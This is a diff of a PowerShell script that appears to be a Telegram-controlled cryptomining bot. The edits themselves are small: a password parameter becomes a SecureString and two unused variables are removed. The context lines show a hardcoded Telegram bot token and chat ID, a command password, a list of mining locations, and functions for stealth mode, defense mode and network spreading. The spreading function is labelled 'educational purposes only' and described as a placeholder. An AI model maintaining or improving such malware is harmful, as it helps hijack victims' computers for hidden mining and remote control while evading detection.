@@ -4,7 +4,7 @@
 param(
     [string]$TelegramToken = "7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE",
     [string]$ChatID = "8112985977",
-    [string]$CommandPassword = "beast2025"
+    [SecureString]$CommandPassword = (ConvertTo-SecureString "beast2025" -AsPlainText -Force)
 )
 
 $MiningLocations = @(
@@ -182,7 +182,6 @@ function Enable-StealthMode {
 }
 
 function Get-SystemHealth {
-    $cpu = Get-WmiObject Win32_Processor
     $memory = Get-WmiObject Win32_ComputerSystem
     $disk = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DeviceID -eq "C:"}
     
@@ -226,7 +225,6 @@ function Enable-DefenseMode {
 function Invoke-NetworkSpread {
     # Discover network computers (educational purposes only)
     try {
-        $computers = Get-WmiObject -Class Win32_ComputerSystem -ComputerName (Get-Content env:computername)
         # Note: Actual network spreading would require additional network discovery and authentication
         # This is a placeholder for educational demonstration
         
